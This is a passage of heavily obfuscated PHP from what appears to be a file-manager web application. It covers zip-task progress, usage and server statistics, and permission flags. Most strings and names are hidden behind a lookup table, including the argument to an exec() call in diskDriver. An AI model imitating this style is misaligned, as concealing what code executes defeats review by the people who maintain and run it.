taskEnd($¢í©º°æ) { $ØÉ÷£ª› =& $_SERVER[áäÒ½¯Ç]; if (!$¢í©º°æ || $this->taskID != $¢í©º°æ[$ØÉ÷£ª›[492]]) { return; } $ˆ¼óÀ…¶ = $¢í©º°æ ? LNG($ØÉ÷£ª›[2031]) . $ØÉ÷£ª›[4] . $¢í©º°æ[$ØÉ÷£ª›[1927]] . $ØÉ÷£ª›[8] . $¢í©º°æ[$ØÉ÷£ª›[1178]] . LNG($ØÉ÷£ª›[2029]) . $ØÉ÷£ª›[74] : $ØÉ÷£ª›[12]; echoLog($ØÉ÷£ª›[2032] . $¢í©º°æ[$ØÉ÷£ª›[1815]] . ($¢í©º°æ[$ØÉ÷£ª›[545]] ? $ØÉ÷£ª›[74] . $¢í©º°æ[$ØÉ÷£ª›[545]] : $ØÉ÷£ª›[12]) . $ØÉ÷£ª›[74] . $ˆ¼óÀ…¶ . $ØÉ÷£ª›[2033] . sprintf($ØÉ÷£ª›[965], timeFloat() - $¢í©º°æ[$ØÉ÷£ª›[1930]]) . $ØÉ÷£ª›[1942]); $this->end(); } public function taskKill($‘²ØÒùŠ) { $ÅÂ·³©˜ =& $_SERVER[áäÒ½¯Ç]; if (!$‘²ØÒùŠ || $this->taskID != $‘²ØÒùŠ[$ÅÂ·³©˜[492]]) { return; } echoLog($ÅÂ·³©˜[2034] . $‘²ØÒùŠ[$ÅÂ·³©˜[1815]]); } } goto b›®ÒĞë„; Bò°â¤ä„¾: class TaskZip extends TaskFileTransfer { protected function startAfter() { $á†€Ùè =& $_SERVER[áäÒ½¯Ç]; parent::startAfter(); Hook::bind($á†€Ùè[2062], array($this, $á†€Ùè[2052])); Hook::bind($á†€Ùè[2054], array($this, $á†€Ùè[2055])); $¨Ù¯· =& $this->task; $¨Ù¯·[$á†€Ùè[2056]] = $á†€Ùè[1331]; if (!$¨Ù¯·[$á†€Ùè[1815]]) { $¨Ù¯·[$á†€Ùè[1815]] = LNG($á†€Ùè[2063]); } } protected function endAfter() { $ûŠÄŞ’ò =& $_SERVER[áäÒ½¯Ç]; parent::endAfter(); Hook::unbind($ûŠÄŞ’ò[2062], array($this, $ûŠÄŞ’ò[2052])); Hook::unbind($ûŠÄŞ’ò[2054], array($this, $ûŠÄŞ’ò[2055])); } public function updateAfter() { $”ìªÁò =& $_SERVER[áäÒ½¯Ç]; $”¦åĞ© =& $this->task; if (!$”¦åĞ©[$”ìªÁò[1178]] || !$”¦åĞ©[$”ìªÁò[866]]) { return; } if ($”¦åĞ©[$”ìªÁò[2056]] == $”ìªÁò[1331]) { $÷Õ£ä› = $”¦åĞ©[$”ìªÁò[1981]]; if ($”¦åĞ©[$”ìªÁò[1982]] != $”ìªÁò[1331]) { $÷Õ£ä› = 0; } $úå—“ûÕ = ($”¦åĞ©[$”ìªÁò[1985]] + $÷Õ£ä›) / $”¦åĞ©[$”ìªÁò[866]]; $”¦åĞ©[$”ìªÁò[1928]] = $úå—“ûÕ * 0.3; } else { if ($”¦åĞ©[$”ìªÁò[2056]] == $”ìªÁò[398]) { $úå—“ûÕ = $”¦åĞ©[$”ìªÁò[1927]] / $”¦åĞ©[$”ìªÁò[1178]]; $”¦åĞ©[$”ìªÁò[1928]] = 0.3 + $úå—“ûÕ * 0.5; } else { if ($”¦åĞ©[$”ìªÁò[2056]] == $”ìªÁò[108]) { $úå—“ûÕ = 0; if ($”¦åĞ©[$”ìªÁò[1980]]) { $úå—“ûÕ = $”¦åĞ©[$”ìªÁò[1981]] / $”¦åĞ©[$”ìªÁò[1980]]; } $”¦åĞ©[$”ìªÁò[1928]] = 0.3 + 0.5 + $úå—“ûÕ * 0.2; } } } if ($”¦åĞ©[$”ìªÁò[1928]] > 0) { $·œøšî = timeFloat() - $”¦åĞ©[$”ìªÁò[1930]] - $”¦åĞ©[$”ìªÁò[1933]]; $”¦åĞ©[$”ìªÁò[1934]] = $·œøšî * (1 - $”¦åĞ©[$”ìªÁò[1928]]) / $”¦åĞ©[$”ìªÁò[1928]]; } } public function copyFileStart($Çá¿ıÁÇ, $„×ª±¹Ñ, $å²§Äµû, $ŞìííÏı, $è‹«¢Ÿ, $î¤¨•ş) { $ñ¹îí…£ =& $_SERVER[áäÒ½¯Ç]; parent::copyFileStart($Çá¿ıÁÇ, $„×ª±¹Ñ, $å²§Äµû, $ŞìííÏı, $è‹«¢Ÿ, $î¤¨•ş); $ı©ºçõğ =& $this->task; if ($ı©ºçõğ[$ñ¹îí…£[2056]] == $ñ¹îí…£[398]) { $ı©ºçõğ[$ñ¹îí…£[2056]] = $ñ¹îí…£[108]; } $this->update(); } public function copyFileEnd($•—Øã€, $ÈÉÅÚŒ, $¯èşŠ·, $ƒí›ı¯, $´½ßï°Î, $ì€¶üÎé) { $½ÇÒ³¸ =& $_SERVER[áäÒ½¯Ç]; $òŸ¬¾‘ğ =& $this->task; $òŸ¬¾‘ğ[$½ÇÒ³¸[1981]] = $òŸ¬¾‘ğ[$½ÇÒ³¸[1980]]; $òŸ¬¾‘ğ[$½ÇÒ³¸[1985]] += $òŸ¬¾‘ğ[$½ÇÒ³¸[1980]]; $òŸ¬¾‘ğ[$½ÇÒ³¸[1982]] = $½ÇÒ³¸[12]; $this->update(); } public function zipEvent($õ¢é£…İ, $ƒÚ¡¡ëû, $¼ôîÁé„, $¶×³¥Ã„) { $ª¸ ôù“ =& $_SERVER[áäÒ½¯Ç]; $ÕÒ‘ï’Æ =& $this->task; $ÕÒ‘ï’Æ[$ª¸ ôù“[1978]] = get_path_this($ƒÚ¡¡ëû); $ÕÒ‘ï’Æ[$ª¸ ôù“[1980]] = $¶×³¥Ã„; $ÕÒ‘ï’Æ[$ª¸ ôù“[1981]] = $¼ôîÁé„; $ÕÒ‘ï’Æ[$ª¸ ôù“[1180]] = $õ¢é£…İ == $ª¸ ôù“[2064] ? $ª¸ ôù“[2059] : $ª¸ ôù“[2060]; $ÕÒ‘ï’Æ[$ª¸ ôù“[1982]] = $ª¸ ôù“[12]; $ÕÒ‘ï’Æ[$ª¸ ôù“[866]] = $¶×³¥Ã„; $ÕÒ‘ï’Æ[$ª¸ ôù“[2056]] = $ª¸ ôù“[398]; $this->update(); } public function nameParse($‚•‡é©) { $©ïÔÊ—Œ =& $_SERVER[áäÒ½¯Ç]; $ÌÇš¹”ò =& $this->task; if ($ÌÇš¹”ò[$©ïÔÊ—Œ[1927]] < $ÌÇš¹”ò[$©ïÔÊ—Œ[1178]]) { $…“«¼êÔ = get_path_this($‚•‡é©); if (strstr($…“«¼êÔ, $©ïÔÊ—Œ[10])) { $ÌÇš¹”ò[$©ïÔÊ—Œ[1927]] += 1; } } if ($ÌÇš¹”ò[$©ïÔÊ—Œ[2056]] == $©ïÔÊ—Œ[1331]) { $ÌÇš¹”ò[$©ïÔÊ—Œ[2056]] = $©ïÔÊ—Œ[398]; } $ÌÇš¹”ò[$©ïÔÊ—Œ[1978]] = $‚•‡é©; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¸•úí¾™) { $î¿’íÇ =& $_SERVER[áäÒ½¯Ç]; $…Ø‰‘‹ = array($î¿’íÇ[690] => array($î¿’íÇ[33] => $î¿’íÇ[2065], $î¿’íÇ[361] => array($î¿’íÇ[293], $î¿’íÇ[868], $î¿’íÇ[2066], $î¿’íÇ[2067])), $î¿’íÇ[2068] => array($î¿’íÇ[33] => $î¿’íÇ[2069], $î¿’íÇ[361] => array($î¿’íÇ[293], $î¿’íÇ[866], $î¿’íÇ[2070], $î¿’íÇ[2071], $î¿’íÇ[2072]))); if (!isset($…Ø‰‘‹[$¸•úí¾™])) { return !1; } $this->optionType = $…Ø‰‘‹[$¸•úí¾™][$î¿’íÇ[33]]; $this->field = $…Ø‰‘‹[$¸•úí¾™][$î¿’íÇ[361]]; return !0; } public function listData($Š‘ë»ê¸ = false, $Á©­ÍÂ = "\x6d\157\x64\x69\146\171\124\151\155\x65", $ïÑöğ­¡ = false) { return parent::listData($Š‘ë»ê¸, $Á©­ÍÂ, $ïÑöğ­¡); } public function trendList($ğ©î»Ç) { $Æ™µ›ØÄ =& $_SERVER[áäÒ½¯Ç]; $”÷­¤¼ = $this->listData(); if ($”÷­¤¼) { $–şŸÍÏÏ = end($”÷­¤¼); $«÷‡÷±ê = date($Æ™µ›ØÄ[2073], strtotime($Æ™µ›ØÄ[2074])); if ($–şŸÍÏÏ[$Æ™µ›ØÄ[293]] == $«÷‡÷±ê) { return $”÷­¤¼; } $Åº×ø¡ = strtotime($–şŸÍÏÏ[$Æ™µ›ØÄ[293]]); } if (!isset($Åº×ø¡)) { $Ü±™¾“§ = $ğ©î»Ç == $Æ™µ›ØÄ[690] ? $Æ™µ›ØÄ[622] : $Æ™µ›ØÄ[935]; $Åº×ø¡ = Model($Ü±™¾“§)->min($Æ™µ›ØÄ[242]); } $á…éâš = $Æ™µ›ØÄ[2075] . ucfirst($ğ©î»Ç); $ĞİöûÀŞ = $this->dateList($Åº×ø¡); foreach ($ĞİöûÀŞ as $«÷‡÷±ê) { $this->{$á…éâš}($«÷‡÷±ê); } return $this->listData(); } private function dateList($ÈĞ‡‰­) { $ìÜ­Î• =& $_SERVER[áäÒ½¯Ç]; $¤ÓÊğÆÏ = $ÈĞ‡‰­; $  ÆÉ¤ö = strtotime($ìÜ­Î•[2074]); $Â«ì³—î = array(); while ($¤ÓÊğÆÏ <= $  ÆÉ¤ö) { $Â«ì³—î[] = date($ìÜ­Î•[2073], $¤ÓÊğÆÏ); $¤ÓÊğÆÏ = strtotime($ìÜ­Î•[2076], $¤ÓÊğÆÏ); } return $Â«ì³—î; } public function _recordUser($‘¸§Û¥Ó = '') { $¨ú‹ÍÌ¾ =& $_SERVER[áäÒ½¯Ç]; $¯‹î¢å“ = strtotime(date($¨ú‹ÍÌ¾[2077], strtotime($‘¸§Û¥Ó))); $Å±÷ù×§ = strtotime(date($¨ú‹ÍÌ¾[2078], strtotime($‘¸§Û¥Ó))); $ÉŒ›é²¤ = array($¨ú‹ÍÌ¾[242] => array($¨ú‹ÍÌ¾[1129], $Å±÷ù×§)); $¤’Ÿ™äº = Model($¨ú‹ÍÌ¾[622])->where($ÉŒ›é²¤)->count($¨ú‹ÍÌ¾[1542]); $ÉŒ›é²¤[$¨ú‹ÍÌ¾[242]] = array($¨ú‹ÍÌ¾[418], array($¯‹î¢å“, $Å±÷ù×§)); $ç±¹ççÃ = Model($¨ú‹ÍÌ¾[622])->where($ÉŒ›é²¤)->count($¨ú‹ÍÌ¾[1542]); $ÉŒ›é²¤[$¨ú‹ÍÌ¾[33]] = $¨ú‹ÍÌ¾[2079]; $¬õÌõ˜ = Model($¨ú‹ÍÌ¾[2080])->where($ÉŒ›é²¤)->count($¨ú‹ÍÌ¾[2081]); $¨ÑÚÁˆÃ = array($¨ú‹ÍÌ¾[293] => $‘¸§Û¥Ó, $¨ú‹ÍÌ¾[868] => (int) $¤’Ÿ™äº, $¨ú‹ÍÌ¾[2066] => (int) $ç±¹ççÃ, $¨ú‹ÍÌ¾[2067] => (int) $¬õÌõ˜); return $this->insert($¨ÑÚÁˆÃ); } public function _recordStore($‚š™ÃÎ = '') { $™ëóœ´ =& $_SERVER[áäÒ½¯Ç]; $ˆËì½Š = strtotime(date($™ëóœ´[2078], strtotime($‚š™ÃÎ))); $•¬Àüï¾ = array($™ëóœ´[242] => array($™ëóœ´[1129], $ˆËì½Š)); $¹™‹ï®À = Model($™ëóœ´[565])->where($•¬Àüï¾)->sum($™ëóœ´[79]); $•¬Àüï¾[$™ëóœ´[505]] = 0; $³„ù«ÁÉ = Model($™ëóœ´[935])->where($•¬Àüï¾)->sum($™ëóœ´[79]); $•¬Àüï¾[$™ëóœ´[189]] = 1; $Îäî£õ = Model($™ëóœ´[935])->where($•¬Àüï¾)->sum($™ëóœ´[79]); $•¬Àüï¾[$™ëóœ´[189]] = 2; $¥’¹¹ïé = Model($™ëóœ´[935])->where($•¬Àüï¾)->sum($™ëóœ´[79]); $³¥‘ áË = array($™ëóœ´[293] => $‚š™ÃÎ, $™ëóœ´[866] => (int) $³„ù«ÁÉ, $™ëóœ´[2070] => (int) $¹™‹ï®À, $™ëóœ´[2071] => (int) $Îäî£õ, $™ëóœ´[2072] => (int) $¥’¹¹ïé); return $this->insert($³¥‘ áË); } public function trend($êûˆ©Ê†, $ùË¿Ô™) { $€¶¶àÖş =& $_SERVER[áäÒ½¯Ç]; if (!$this->init($êûˆ©Ê†)) { return !1; } $îì˜ ° = $this->trendList($êûˆ©Ê†); if ($îì˜ ° && $ùË¿Ô™ != $€¶¶àÖş[1900]) { $¶Ë®“½ = $îì˜ °[0][$€¶¶àÖş[293]]; $‰äìí¾‰ = $this->validDate($ùË¿Ô™, $¶Ë®“½); $¼Şı„Î = array(); $ÑüîäƒÔ = array_to_keyvalue($îì˜ °, $€¶¶àÖş[293]); foreach ($‰äìí¾‰ as $†ÕÚäİ) { if (isset($ÑüîäƒÔ[$†ÕÚäİ])) { $°¬ÛƒóÒ = $ÑüîäƒÔ[$†ÕÚäİ]; } else { $°¬ÛƒóÒ = end($îì˜ °); $°¬ÛƒóÒ[$€¶¶àÖş[293]] = $†ÕÚäİ; if ($êûˆ©Ê† == $€¶¶àÖş[690]) { $°¬ÛƒóÒ[$€¶¶àÖş[2066]] = $°¬ÛƒóÒ[$€¶¶àÖş[2067]] = 0; } } $¼Şı„Î[] = $°¬ÛƒóÒ; } $îì˜ ° = $¼Şı„Î; } $‡¨üáÕ‰ = array($€¶¶àÖş[690] => array($€¶¶àÖş[868] => LNG($€¶¶àÖş[2082]), $€¶¶àÖş[2066] => LNG($€¶¶àÖş[2083]), $€¶¶àÖş[2067] => LNG($€¶¶àÖş[2084])), $€¶¶àÖş[2068] => array($€¶¶àÖş[866] => LNG($€¶¶àÖş[2085]), $€¶¶àÖş[2070] => LNG($€¶¶àÖş[2086]), $€¶¶àÖş[2071] => LNG($€¶¶àÖş[2087]), $€¶¶àÖş[2072] => LNG($€¶¶àÖş[2088]))); $‚©„•‰û = array($€¶¶àÖş[690] => $€¶¶àÖş[2089], $€¶¶àÖş[2068] => $€¶¶àÖş[79]); if (empty($îì˜ °)) { $†ÕÚäİ = date($€¶¶àÖş[2073], strtotime($€¶¶àÖş[2074])); $ºÏƒ‚ª« = array($€¶¶àÖş[293] => $†ÕÚäİ); foreach ($‡¨üáÕ‰[$êûˆ©Ê†] as $ÉŒº ¸® => $³âõî·²) { $ºÏƒ‚ª«[$ÉŒº ¸®] = 0; } $îì˜ °[] = $ºÏƒ‚ª«; } $²òîô‚Ä = array(); foreach ($îì˜ ° as $³âõî·²) { if ($êûˆ©Ê† == $€¶¶àÖş[2068] && $³âõî·²[$€¶¶àÖş[2070]] > $³âõî·²[$€¶¶àÖş[866]]) { $³âõî·²[$€¶¶àÖş[2070]] = $³âõî·²[$€¶¶àÖş[866]]; } foreach ($‡¨üáÕ‰[$êûˆ©Ê†] as $ÉŒº ¸® => $˜œ£ÚÉõ) { $°¬ÛƒóÒ = array($€¶¶àÖş[293] => $³âõî·²[$€¶¶àÖş[293]], $€¶¶àÖş[1815] => $˜œ£ÚÉõ); $°¬ÛƒóÒ[$‚©„•‰û[$êûˆ©Ê†]] = isset($³âõî·²[$ÉŒº ¸®]) ? $³âõî·²[$ÉŒº ¸®] : 0; $²òîô‚Ä[] = $°¬ÛƒóÒ; } } return $²òîô‚Ä; } public function validDate($„çÏ‰ß, $±ÏÖÑ¡) { $‹Í¢Õèı =& $_SERVER[áäÒ½¯Ç]; $À›ºÃÏâ = date($‹Í¢Õèı[2073], strtotime($‹Í¢Õèı[2074])); $î«¸¹èÒ = array($À›ºÃÏâ); switch ($„çÏ‰ß) { case $‹Í¢Õèı[1907]: $Œ¼–å = mktime(0, 0, 0, date($‹Í¢Õèı[2090]), date($‹Í¢Õèı[1608]) - date($‹Í¢Õèı[1694]) + 7 - 7, date($‹Í¢Õèı[2091])); $¸Ó˜ö¥ü = 0; do { $áõÊº = date($‹Í¢Õèı[2073], $Œ¼–å - 3600 * 24 * 7 * $¸Ó˜ö¥ü); $î«¸¹èÒ[] = $áõÊº; $¸Ó˜ö¥ü++; } while ($±ÏÖÑ¡ < $áõÊº); break; case $‹Í¢Õèı[1905]: $¸Ó˜ö¥ü = 1; do { $¹ùç¿ŸÒ = date($‹Í¢Õèı[2092], strtotime("\55\x20{$¸Ó˜ö¥ü}\x20\155\157\156\x74\x68\163")); $î«¸¹èÒ[] = $¹ùç¿ŸÒ; $¸Ó˜ö¥ü++; } while ($±ÏÖÑ¡ < $¹ùç¿ŸÒ); break; case $‹Í¢Õèı[2093]: $òµÄŞÀİ = (int) date($‹Í¢Õèı[2091], strtotime($±ÏÖÑ¡)); $ü‘×ÌÀ = (int) date($‹Í¢Õèı[2091]); if ($òµÄŞÀİ >= $ü‘×ÌÀ) { break; } for ($òµÄŞÀİ; $òµÄŞÀİ < $ü‘×ÌÀ; $òµÄŞÀİ++) { $î«¸¹èÒ[] = $òµÄŞÀİ . $‹Í¢Õèı[2094]; } break; default: break; } if ($±ÏÖÑ¡ > end($î«¸¹èÒ)) { array_pop($î«¸¹èÒ); } sort($î«¸¹èÒ); return $î«¸¹èÒ; } public function listTable($–¯Îæ¹È) { $ë Ÿš¥ò = ucfirst($–¯Îæ¹È); return Model($ë Ÿš¥ò)->listData(); } public function option($æ‘¥ç±) { return call_user_func_array(array($this, $_SERVER[áäÒ½¯Ç][2095] . ucfirst($æ‘¥ç±)), array()); } private function optionUser() { $âÀ¿¤ø™ =& $_SERVER[áäÒ½¯Ç]; $¥ã¬Ãô— = Model($âÀ¿¤ø™[622])->count($âÀ¿¤ø™[1542]); $¬¨¬ï¡Ö = Model($âÀ¿¤ø™[622])->where($âÀ¿¤ø™[2096])->count($âÀ¿¤ø™[1542]); $ãÌµ†Áõ = intval($GLOBALS[$âÀ¿¤ø™[6]][$âÀ¿¤ø™[434]][$âÀ¿¤ø™[1873]]) / 3600; $€ôóå­ı = strtotime("\55{$ãÌµ†Áõ}\40\x68\x6f\165\x72\163"); $³ıËØî’ = strtotime(date($âÀ¿¤ø™[2077])); if ($€ôóå­ı < $³ıËØî’) { $€ôóå­ı = $³ıËØî’; } $”Ùœéä = array($âÀ¿¤ø™[2097] => array($âÀ¿¤ø™[1130], $€ôóå­ı)); $’–ÛâÌÚ = (int) Model($âÀ¿¤ø™[622])->where($”Ùœéä)->count($âÀ¿¤ø™[1542]); if (!$’–ÛâÌÚ) { $’–ÛâÌÚ = 1; } $”Ùœéä = array($âÀ¿¤ø™[2097] => array($âÀ¿¤ø™[1130], $³ıËØî’)); $›¼’óÙÔ = Model($âÀ¿¤ø™[622])->where($”Ùœéä)->count($âÀ¿¤ø™[1542]); return array($âÀ¿¤ø™[861] => (int) $¥ã¬Ãô—, $âÀ¿¤ø™[2098] => (int) ($¥ã¬Ãô— - $¬¨¬ï¡Ö), $âÀ¿¤ø™[2099] => (int) $¬¨¬ï¡Ö, $âÀ¿¤ø™[2100] => (int) $›¼’óÙÔ, $âÀ¿¤ø™[2101] => $’–ÛâÌÚ); } private function optionFile() { $Îï–àú² =& $_SERVER[áäÒ½¯Ç]; $öÈ¨¿à = $this->sourceSize(); $²Öß¬Ú¢ = $öÈ¨¿à[$Îï–àú²[79]]; $ø ‚šƒ = $öÈ¨¿à[$Îï–àú²[2070]]; $Ú‹¦³Œ¶ = Model($Îï–àú²[935])->where(array($Îï–àú²[505] => 0))->count($Îï–àú²[192]); $À”§–‚ = array($Îï–àú²[505] => 0, $Îï–àú²[242] => array($Îï–àú²[1130], strtotime(date($Îï–àú²[2077])))); $¶Ö€óİø = Model($Îï–àú²[935])->where($À”§–‚)->sum($Îï–àú²[79]); $åãñ•ûô = Model($Îï–àú²[935])->where($À”§–‚)->count($Îï–àú²[192]); return array($Îï–àú²[866] => $²Öß¬Ú¢, $Îï–àú²[2070] => $ø ‚šƒ, $Îï–àú²[2102] => $²Öß¬Ú¢ - $ø ‚šƒ, $Îï–àú²[2103] => (int) $¶Ö€óİø, $Îï–àú²[868] => (int) $Ú‹¦³Œ¶, $Îï–àú²[2104] => (int) $åãñ•ûô); } private function optionAccess() { $Õ¹²ºÜ =& $_SERVER[áäÒ½¯Ç]; return array($Õ¹²ºÜ[861] => $this->typeLogCnt(), $Õ¹²ºÜ[108] => $this->typeLogCnt($Õ¹²ºÜ[108]), $Õ¹²ºÜ[544] => $this->typeLogCnt($Õ¹²ºÜ[544]), $Õ¹²ºÜ[1280] => $this->typeLogCnt($Õ¹²ºÜ[1280]), $Õ¹²ºÜ[1511] => $this->typeLogCnt($Õ¹²ºÜ[1511]), $Õ¹²ºÜ[690] => $this->typeLogCnt($Õ¹²ºÜ[12], $Õ¹²ºÜ[2081])); } private function typeLogCnt($üªÊİ‚ = '', $Šß–Åê = "\x69\x64") { $äÛï§¾® =& $_SERVER[áäÒ½¯Ç]; $ÇÑà½¿­ = array($äÛï§¾®[108] => array($äÛï§¾®[2105], $äÛï§¾®[2106]), $äÛï§¾®[544] => array($äÛï§¾®[2107], $äÛï§¾®[2108]), $äÛï§¾®[1280] => array($äÛï§¾®[2109], $äÛï§¾®[2110], $äÛï§¾®[2111]), $äÛï§¾®[1511] => array($äÛï§¾®[2112], $äÛï§¾®[2113]), $äÛï§¾®[1512] => array($äÛï§¾®[2114], $äÛï§¾®[2115], $äÛï§¾®[2116])); $ªëÜàºÔ = strtotime(date($äÛï§¾®[2077])); $¹°ÀÖÔ¶ = array($äÛï§¾®[242] => array($äÛï§¾®[1130], $ªëÜàºÔ)); if ($üªÊİ‚) { $¹°ÀÖÔ¶[$äÛï§¾®[33]] = array($äÛï§¾®[7], $ÇÑà½¿­[$üªÊİ‚]); } $ˆàó¤ïü = Model($äÛï§¾®[2080])->where($¹°ÀÖÔ¶)->count($Šß–Åê); return (int) $ˆàó¤ïü; } private function optionServer() { $·¦ÂÁ“’ =& $_SERVER[áäÒ½¯Ç]; $Ì…€Â¢Æ = $this->diskDriver(); $é…Ì…® = KodIO::defaultDriver(); $ÎÒÅª®¹ = array($·¦ÂÁ“’[928] => $é…Ì…®[$·¦ÂÁ“’[492]]); $ÎŞêÀè¦ = Model($·¦ÂÁ“’[565])->where($ÎÒÅª®¹)->sum($·¦ÂÁ“’[79]); $ûâ½ñš = explode($·¦ÂÁ“’[53], $_SERVER[$·¦ÂÁ“’[145]]); $µ¼‹­ÜÑ = $ûâ½ñš[0]; $õÇ‘°Œó = $GLOBALS[$·¦ÂÁ“’[6]][$·¦ÂÁ“’[21]]; $¼å‘… = $õÇ‘°Œó[$·¦ÂÁ“’[1092]]; if ($¼å‘… == $·¦ÂÁ“’[1080]) { $šÊÒï Ó = explode($·¦ÂÁ“’[1422], $õÇ‘°Œó[$·¦ÂÁ“’[1091]]); $¼å‘… = $šÊÒï Ó[0]; } if ($¼å‘… == $·¦ÂÁ“’[1028] || $¼å‘… == $·¦ÂÁ“’[906]) { $¶¾®ÔÛí = Model()->db()->query($·¦ÂÁ“’[2117]); $áË¢Ìì = $¶¾®ÔÛí[0] && isset($¶¾®ÔÛí[0][$·¦ÂÁ“’[1814]]) ? $¶¾®ÔÛí[0][$·¦ÂÁ“’[1814]] : 0; $¼å‘… = $·¦ÂÁ“’[2118] . ($áË¢Ìì ? $·¦ÂÁ“’[8] . $áË¢Ìì : $·¦ÂÁ“’[12]); } $ûÜ·ÁÉ¡ = $GLOBALS[$·¦ÂÁ“’[6]][$·¦ÂÁ“’[434]][$·¦ÂÁ“’[937]]; return array($·¦ÂÁ“’[2119] => $Ì…€Â¢Æ ? $Ì…€Â¢Æ[$·¦ÂÁ“’[2120]] : 0, $·¦ÂÁ“’[2121] => $Ì…€Â¢Æ ? $Ì…€Â¢Æ[$·¦ÂÁ“’[2122]] : 0, $·¦ÂÁ“’[2123] => (int) $é…Ì…®[$·¦ÂÁ“’[2120]] * 1024 * 1024 * 1024, $·¦ÂÁ“’[2124] => (int) $ÎŞêÀè¦, $·¦ÂÁ“’[2125] => ucfirst($µ¼‹­ÜÑ), $·¦ÂÁ“’[2126] => $·¦ÂÁ“’[2127] . PHP_VERSION, $·¦ÂÁ“’[2128] => phpBuild64() ? 64 : 32, $·¦ÂÁ“’[860] => str_replace($·¦ÂÁ“’[1254], $·¦ÂÁ“’[1108], $¼å‘…), $·¦ÂÁ“’[434] => ucfirst($ûÜ·ÁÉ¡), $·¦ÂÁ“’[32] => $_SERVER[$·¦ÂÁ“’[2129]]); } private function diskDriver() { $‰è·¬€ =& $_SERVER[áäÒ½¯Ç]; $‹¨Â÷†¯ = $‰è·¬€[8]; $ûÌé•ß³ = $GLOBALS[$‰è·¬€[6]][$‰è·¬€[1446]] == $‰è·¬€[1447]; if ($ûÌé•ß³) { $‹¨Â÷†¯ = $‰è·¬€[2130]; if (function_exists($‰è·¬€[2131])) { exec($‰è·¬€[2132], $£¼ô¶‡); $‹¨Â÷†¯ = $£¼ô¶‡[1] . $‰è·¬€[8]; } } if (!file_exists($‹¨Â÷†¯)) { return; } if (!function_exists($‰è·¬€[2133])) { return; } $„Ë«ÏÏı = @disk_total_space($‹¨Â÷†¯); $‚ÏåÓî¦ = $„Ë«ÏÏı - @disk_free_space($‹¨Â÷†¯); return array($‰è·¬€[2120] => $„Ë«ÏÏı, $‰è·¬€[2122] => $‚ÏåÓî¦); } public function fileChart($‚¤á–«¸) { $È½úŒĞ’ =& $_SERVER[áäÒ½¯Ç]; if (isset($‚¤á–«¸[$È½úŒĞ’[1542]])) { return Model($È½úŒĞ’[935])->userFileTypeProfile($‚¤á–«¸[$È½úŒĞ’[1542]]); } if (isset($‚¤á–«¸[$È½úŒĞ’[1444]])) { return Model($È½úŒĞ’[935])->groupFileTypeProfile($‚¤á–«¸[$È½úŒĞ’[1444]]); } $Ó¡§Ä›± = $this->sourceSize(); $›±¹ÛÇß = array($È½úŒĞ’[191] => 0, $È½úŒĞ’[189] => 1); $çÑÑ½¬Ä = Model($È½úŒĞ’[935])->where($›±¹ÛÇß)->sum($È½úŒĞ’[79]); $›±¹ÛÇß[$È½úŒĞ’[189]] = 2; $ ×«¯Ãƒ = Model($È½úŒĞ’[935])->where($›±¹ÛÇß)->sum($È½úŒĞ’[79]); return array($È½úŒĞ’[866] => $Ó¡§Ä›±[$È½úŒĞ’[79]], $È½úŒĞ’[2070] => $Ó¡§Ä›±[$È½úŒĞ’[2070]], $È½úŒĞ’[2071] => (int) $çÑÑ½¬Ä, $È½úŒĞ’[2072] => (int) $ ×«¯Ãƒ); } private function sourceSize() { $ÀÄŸü¾˜ =& $_SERVER[áäÒ½¯Ç]; $åĞË‹şö = Model($ÀÄŸü¾˜[935])->where(array($ÀÄŸü¾˜[505] => 0))->sum($ÀÄŸü¾˜[79]); $İ—ˆ­£´ = Model($ÀÄŸü¾˜[565])->sum($ÀÄŸü¾˜[79]); if ($İ—ˆ­£´ > $åĞË‹şö) { $İ—ˆ­£´ = $åĞË‹şö; } return array($ÀÄŸü¾˜[79] => (int) $åĞË‹şö, $ÀÄŸü¾˜[2070] => (int) $İ—ˆ­£´); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ÿ°‚ïæ‡ =& $_SERVER[áäÒ½¯Ç]; $¼¸øÀ°ù = array(array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2134]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2136], $Ÿ°‚ïæ‡[2137] => 1, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2140]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2141], $Ÿ°‚ïæ‡[2137] => 2, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2142]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2143], $Ÿ°‚ïæ‡[2137] => 3, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2144]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2145], $Ÿ°‚ïæ‡[2137] => 4, $Ÿ°‚ïæ‡[2138] => 1, $Ÿ°‚ïæ‡[2139] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ÿ°‚ïæ‡[514] => LNG($Ÿ°‚ïæ‡[2146]), $Ÿ°‚ïæ‡[2135] => $Ÿ°‚ïæ‡[2147], 